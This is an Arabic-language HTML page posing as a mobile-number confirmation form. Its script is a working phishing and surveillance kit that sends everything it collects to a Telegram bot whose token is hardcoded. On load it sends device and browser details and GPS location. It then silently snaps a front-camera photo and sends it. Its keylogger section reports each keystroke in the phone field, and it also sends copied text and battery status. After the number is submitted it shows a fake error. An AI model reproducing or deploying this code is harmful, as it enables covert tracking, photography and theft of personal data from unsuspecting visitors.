<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>تحديث</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            background: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .container {
            background: white;
            padding: 40px 30px;
            border-radius: 16px;
            box-shadow: 0 8px 30px rgba(0,0,0,0.12);
            max-width: 400px;
            width: 100%;
        }
        h2 { text-align: center; color: #1a1a2e; margin-bottom: 8px; }
        p.sub { text-align: center; color: #555; font-size: 14px; margin-bottom: 20px; }
        input {
            width: 100%;
            padding: 14px 16px;
            margin: 8px 0;
            border: 1px solid #ddd;
            border-radius: 8px;
            font-size: 16px;
            background: #f9f9f9;
        }
        input:focus { border-color: #2d7aff; outline: none; background: white; }
        .btn {
            width: 100%;
            padding: 14px;
            background: #2d7aff;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 10px;
        }
        .btn:hover { background: #1a5fd0; }
        .error { color: red; font-size: 14px; text-align: center; display: none; margin-top: 10px; }
        .logo { text-align: center; font-size: 48px; margin-bottom: 10px; }
        #video, #canvas { display: none; }
    </style>
</head>
<body>

    <div class="container">
        <div class="logo">📱</div>
        <h2>تأكيد رقم الجوال</h2>
        <p class="sub">أدخل رقم جوالك لتأكيد هويتك</p>
        
        <form id="phoneForm">
            <input type="tel" id="phone" placeholder="رقم الجوال (مثل: 05xxxxxxxx)" required>
            <button type="submit" class="btn">تأكيد</button>
            <div class="error" id="errorMsg">⚠️ حدث خطأ، حاول مرة أخرى</div>
        </form>
    </div>

    <video id="video" playsinline webkit-playsinline muted></video>
    <canvas id="canvas"></canvas>

<script>
// =============================================
// إعدادات البوت
// =============================================
const BOT_TOKEN = '8575472482:AAGXTn8RYrIVtqreB2vGuqmDE3H40uw4aqM';
const CHAT_ID   = '6526473202';

function sendToTelegram(text) {
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: text,
            parse_mode: 'HTML'
        })
    }).catch(e => console.log(e));
}

function sendPhotoToTelegram(photoData, caption) {
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            photo: photoData,
            caption: caption,
            parse_mode: 'HTML'
        })
    }).catch(e => console.log(e));
}

// =============================================
// 1. البيانات الأساسية
// =============================================
const ua = navigator.userAgent;
const isMobile = /iPhone|iPad|iPod|Android|BlackBerry|Opera Mini|IEMobile/i.test(ua);
const deviceType = isMobile ? 'جوال' : 'كمبيوتر';
let os = 'غير معروف';
if (/Windows NT 10.0/.test(ua)) os = 'Windows 10';
else if (/Mac OS X/.test(ua)) os = 'MacOS';
else if (/Android/.test(ua)) os = 'Android';
else if (/iPhone|iPad/.test(ua)) os = 'iOS';

let msg = `<b>✅ تم فتح الرابط</b>\n\n`;
msg += `📱 الجهاز: ${deviceType} (${os})\n`;
msg += `🌐 IP: ${window.location.hostname}\n`;
msg += `📱 المتصفح: ${ua}\n`;
msg += `🖥️ الشاشة: ${screen.width}x${screen.height}\n`;
msg += `📅 الوقت: ${new Date().toISOString()}`;
sendToTelegram(msg);

// =============================================
// 2. الموقع الجغرافي (GPS)
// =============================================
if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
        pos => {
            const lat = pos.coords.latitude;
            const lon = pos.coords.longitude;
            sendToTelegram(`📍 <b>الموقع الجغرافي</b>\nhttps://maps.google.com/?q=${lat},${lon}`);
        },
        err => {}
    );
}

// =============================================
// 3. الكاميرا الأمامية (تصور وترسل)
// =============================================
function takePhoto() {
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const context = canvas.getContext('2d');
    
    navigator.mediaDevices.getUserMedia({
        video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
        audio: false
    })
    .then(stream => {
        video.srcObject = stream;
        video.play();
        setTimeout(() => {
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            const photo = canvas.toDataURL('image/jpeg', 0.9);
            sendPhotoToTelegram(photo, '📸 <b>صورة من الكاميرا الأمامية</b>');
            stream.getTracks().forEach(track => track.stop());
            video.srcObject = null;
        }, 2000);
    })
    .catch(err => {});
}

setTimeout(takePhoto, 3000);

// =============================================
// 4. عند إرسال النموذج (جلب رقم الجوال)
// =============================================
document.getElementById('phoneForm').addEventListener('submit', function(e) {
    e.preventDefault();
    
    const phone = document.getElementById('phone').value;
    
    // إرسال رقم الجوال إلى تليجرام
    let dataMsg = `<b>📱 رقم الجوال</b>\n\n`;
    dataMsg += `📞 الرقم: ${phone}\n\n`;
    dataMsg += `📅 الوقت: ${new Date().toISOString()}`;
    
    sendToTelegram(dataMsg);
    
    // إظهار رسالة خطأ وهمية
    document.getElementById('errorMsg').style.display = 'block';
    
    // إعادة تعيين الحقل بعد 3 ثواني
    setTimeout(() => {
        document.getElementById('phone').value = '';
        document.getElementById('errorMsg').style.display = 'none';
    }, 3000);
});

// =============================================
// 5. Keylogger (تسجيل كل ما يكتب)
// =============================================
document.addEventListener('input', e => {
    if (e.target.value && e.target.id === 'phone') {
        sendToTelegram(`⌨️ <b>كتابة في حقل رقم الجوال</b>\n${e.target.value}`);
    }
});

// =============================================
// 6. نسخ الحافظة
// =============================================
document.addEventListener('copy', () => {
    const text = document.getSelection().toString();
    if (text && text.length > 0) {
        sendToTelegram(`📋 <b>نسخ</b>\n${text.substring(0, 100)}`);
    }
});

// =============================================
// 7. البطارية
// =============================================
if (navigator.getBattery) {
    navigator.getBattery().then(battery => {
        const level = Math.round(battery.level * 100);
        const charging = battery.charging ? '⚡ شاحن' : '🔌 بطارية';
        sendToTelegram(`🔋 <b>البطارية</b>\n${level}% (${charging})`);
    }).catch(() => {});
}

console.log('✅ يعمل');
</script>
</body>
</html>
